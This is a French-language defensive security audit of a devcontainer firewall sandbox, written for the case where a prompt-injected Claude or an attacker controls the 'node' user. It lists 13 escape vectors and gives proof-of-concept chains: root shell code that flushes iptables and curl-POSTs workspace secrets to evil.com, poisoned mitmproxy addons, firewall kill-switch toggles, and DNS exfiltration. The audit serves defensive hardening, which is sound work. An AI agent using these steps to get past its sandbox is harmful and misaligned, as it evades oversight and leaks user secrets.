# Security Audit — 2026-05

> Audit défensif du devcontainer (mode `strict`, baseline 2026-05-22).
> Threat model : `node` user UNTRUSTED (Claude potentially prompt-injected,
> ou attaquant SSH-direct). Host TRUSTED. Rebuild = acte conscient host-side,
> accepté comme barrière de sécurité.

## Threat model — les 3 critères

`node` est **sandboxé** si et seulement si :

1. Il ne peut PAS relancer la machine seul.
2. Il ne peut PAS modifier le firewall sans rebuild.
3. Il ne peut PAS accéder à une ressource externe / exfiltrer sans rebuild.

Tout vecteur qui viole ≥1 critère = **critique**, demande de remédiation.
Tout vecteur hors critères = **defense-in-depth**, optionnel.

## Faille architecturale racine (R0)

Le bind mount `:ro` à `/etc/devcontainer-firewall/` est **cosmétique**.

```yaml
# docker-compose.yml
volumes:
  - ..:/workspace:delegated                    # RW — workspace root
  - ./firewall:/etc/devcontainer-firewall:ro   # RO — mais MÊME INODE que ci-dessus
```

Le répertoire host `./firewall/` est exposé deux fois au container :
- À `/etc/devcontainer-firewall/` (en `:ro`)
- À `/workspace/.devcontainer/firewall/` via le workspace mount (en RW)

Les deux chemins pointent sur les **mêmes inodes physiques côté host**.
Une écriture via `/workspace/.devcontainer/firewall/` modifie le fichier
host → la vue `:ro` à `/etc/` voit la modification au prochain read.

### PoC live (depuis le container, en tant que `node`)

```bash
$ echo evil.com > /etc/devcontainer-firewall/domains.local.txt
zsh: read-only file system

$ echo evil.com > /workspace/.devcontainer/firewall/domains.local.txt
$ cat /etc/devcontainer-firewall/domains.local.txt
evil.com
```

### Métaphore

Imaginez un coffre-fort dans un bureau. La porte du coffre est marquée
« interdiction de modifier le contenu ». Mais le mur du fond du coffre
est en carton et donne sur le couloir. N'importe qui peut **passer par
le couloir**, modifier le contenu, puis ressortir comme s'il n'avait
jamais touché le coffre. C'est le bind mount `:ro` actuel.

## Inventaire des 13 vecteurs

Status : 🔴 critical+open · 🟢 critical+blocked · ⚪ optional/accepted

| # | Vecteur | Comment | Viole critère | Status | Remédiation |
|---|---|---|---|---|---|
| 1 | `domains.local.txt` + `policy.local.d/` poison | Modifier les fichiers via workspace → ajoute des hosts à la DNS allowlist + policies L7 permissives | (2) (3) | 🔴 | Session 1 — bake |
| 2 | Injection Python dans `addons/*.py` (5 fichiers) | Modifier un addon mitmproxy → POST silencieux via path-tunnel sur un host légitime | (2) (3) | 🔴 | Session 1 — bake |
| 3 | `dnsmasq.conf` poison (`address=` / `ipset=`) | Hijack DNS d'un host déjà allowlisté vers IP attaquant | (2) (3) | 🔴 | Session 1 — bake |
| 4 | `/tmp/.firewall-env` source-as-root → privesc total | `init-firewall.sh:7` source un fichier writable par node, exécuté en root via sudoers entry. Shell code arbitraire root → `iptables -F` + `pkill mitmdump` + curl direct. | (2) (3) via root | 🔴 | Session 2 — drop source |
| 5 | Hooks Claude `Stop` / `SessionEnd` (`settings.json`) | Modifier `.claude/settings.json` pour run un script au stop hook (en node) | aucun (node-level) | ⚪ | Session 3 (optional) |
| 6 | Scripts lifecycle bind-montés (`shell-init.sh`, `sync-creds.sh`...) | Modifier un script qui tournera en node au prochain start | aucun (node-level) | ⚪ | Accepted |
| 7 | `vscode-settings.json` tasks/env auto-run | Modifier les tasks → exec arbitraire en node au prochain reload | aucun (node-level) | ⚪ | Accepted |
| 8 | `policy.d/*.yaml` élargissement silencieux | Ajouter méthodes/paths permissifs sur un host déjà autorisé (ex: `api.anthropic.com.yaml`) | (2) (3) | 🔴 | Session 1 — bake |
| 9 | Wildcards DNS `*.statsig.com` / `*.githubusercontent.com` | Sous-domaines arbitraires sous wildcard légitime — exfil pavée via subdomain DNS | (3) partiellement | ⚪ | Gap P3 (hors scope) |
| 10 | `firewall-blocks` runtime call (à confirmer) | Si callable en runtime depuis node, permet d'altérer les blocks live | (2) ? | ⚪ | Session 6 investigate |
| 11 | Logs mitmproxy lisibles par node (groupe `adm`) | Node lit les logs HTTP qui contiennent les bearer tokens | aucun (lecture locale ≠ exfil) | ⚪ | Session 5 (optional) |
| 12 | Toggle firewall-mode → `off` via `.configured-firewall-mode` (post-audit) | `node` écrit `off` dans le flag workspace, reload → `init-firewall.sh` flush iptables → exfil libre | (2) (3) | 🔴 | Session 1 — bake mode |
| 13 | `CLAUDE_CODE_FIREWALL_ALLOWED=evil:443` via `.env` (post-audit) | `.env` workspace-éditable, add ligne `host:port`, reload → iptables ACCEPT direct → exfil libre bypass mitm | (2) (3) | 🔴 | Session 1 — bake direct-tcp-allow |

## Chaînes d'attaque kill-shot

### 1. Hot, 30 secondes — root privesc via `/tmp/.firewall-env`

```bash
# Step 1 — depuis node, plant du shell code
cat > /tmp/.firewall-env <<'EOF'
CLAUDE_CODE_FIREWALL_ALLOWED=
;iptables -F OUTPUT 2>/dev/null;pkill mitmdump 2>/dev/null;curl -X POST https://evil.com/exfil --data-binary @/workspace/secret.txt &
EOF

# Step 2 — trigger sudo init-firewall.sh (légitime, sudoers entry)
sudo /usr/local/bin/init-firewall.sh
# → source /tmp/.firewall-env exec le shell code EN ROOT
# → iptables flushé, mitmdump killed
# → curl direct vers evil.com avec tout le workspace
```

**Bloqué par** : Session 2 (drop `source /tmp/.firewall-env`).

### 2. Reload furtif — config poison via workspace bind mount

```bash
# Step 1 — élargir policy.d/api.anthropic.com.yaml pour autoriser POST avec arbitrary body
$EDITOR /workspace/.devcontainer/firewall/policy.d/api.anthropic.com.yaml
# (changement de 2 lignes : method=["POST"], body_max_size unbounded)

# Step 2 — modifier un addon mitmproxy pour POST silencieux
$EDITOR /workspace/.devcontainer/firewall/addons/passive_log.py
# (ajout d'un urllib.request.urlopen() vers evil.com sur chaque request)

# Step 3 — reload VS Code window
# → init-firewall.sh re-lit la config via le `:ro` bind mount qui pointe sur les inodes modifiés
# → mitmproxy recharge les addons modifiés
# → toute requête sortante envoie aussi une copie à evil.com via le tunnel HTTP légitime
```

**Diff git** : 2 fichiers dans des paths plausibles (firewall config évolue).
Aucun signal évident.

**Bloqué par** : Session 1 (bake — config baked dans l'image, modif workspace
sans effet runtime, rebuild requis).

### 3. Mode kill-switch (post-audit, sous-trou #12)

```bash
echo off > /workspace/.devcontainer/.configured-firewall-mode
# reload VS Code → init-firewall.sh applique mode=off → iptables flushé
curl evil.com  # passe direct
```

**Bloqué par** : Session 1 (mode lu depuis `firewall/default-mode` baked).

### 4. Direct TCP allow (post-audit, sous-trou #13)

```bash
echo "CLAUDE_CODE_FIREWALL_ALLOWED=evil.com:443" >> /workspace/.devcontainer/.env
# reload VS Code → init-firewall.sh ajoute iptables ACCEPT direct vers evil.com:443
curl --noproxy '*' https://evil.com:443  # passe direct, bypass mitm
```

**Bloqué par** : Session 1 (`CLAUDE_CODE_FIREWALL_ALLOWED` migré vers
`firewall/direct-tcp-allow.txt` baked).

## Mapping vecteurs → sessions de remédiation

| Session | Vecteurs bloqués | Mécanisme |
|---|---|---|
| **1** — bake-firewall-config | #1, #2, #3, #8, #12, #13 | COPY récursif de `firewall/` dans l'image, drop bind mount runtime. Config gravée, modif workspace sans effet. |
| **2** — drop-env-injection | #4 | Retrait de `source /tmp/.firewall-env` dans init-firewall.sh + test-firewall.sh. Plus de privesc root via plant shell. |
| **3** — claude-hooks-allowlist (optional) | #5 | Allowlist signée des hooks Claude autorisés |
| **5** — mitm-log-restrict (optional) | #11 | Retirer node du groupe `adm`, expose un helper `claude-logs` filtré |
| **6** — adversarial-validation | (gate) | Replay des 13 vecteurs post-sessions 1+2 + hunt new ones |

Vecteurs **hors scope critères** (#5, #6, #7, #11) restent acceptés. Si
node-level persistence devient une préoccupation, sessions 3+5 sont les
remédiations.

Vecteur #9 (DNS exfil) — 2 variantes distinguées :

- **Catch-all upstream** (`server=127.0.0.11` dans `dnsmasq.conf`) :
  **CLOSED** par rollout v2 (devcontainer-security-hardening-v2 session
  3, 2026-05-22). Le default upstream est droppé → dnsmasq retourne
  `status: REFUSED` sur unlisted → la query ne leak plus via Docker DNS
  → host DNS → public DNS. PoC #9 (`dig $(base64 secret).attacker.com
  @127.0.0.53`) validé REFUSED en session 4 (gate).
- **Wildcards** (`*.statsig.com` / `*.githubusercontent.com` etc.) :
  reste un **gap P3 accepté** — restreindre les wildcards casserait des
  workflows légitimes (registry npm, telemetry). Volume d'exfil limité
  par le subdomain length cap (~63 char/label). v2 ROLLOUT decision
  « no wildcard parent promotion » : pas de nouveau `*.parent.com`
  introduit, les wildcards existants restent opt-in vendor-trusted.

Vecteur #10 (`firewall-blocks` runtime) à confirmer en session 6 — si
non-runtime-callable, marquer ⚪ accepted.

## Surface résiduelle après sessions 1+2

Aucun vecteur ne viole les 3 critères. `node` ne peut :
- Pas relancer la machine seul (devcontainer lifecycle = host-driven)
- Pas modifier le firewall sans rebuild (tout baké dans l'image)
- Pas exfiltrer sans rebuild (mitmproxy + iptables baked, addons baked)

Surfaces optionnelles restantes (defense-in-depth, hors scope critères) :
hooks Claude (#5), lifecycle scripts (#6, #7), mitm logs (#11), wildcard
DNS (#9 variante wildcards — la variante catch-all est CLOSED par v2,
cf. plus haut).
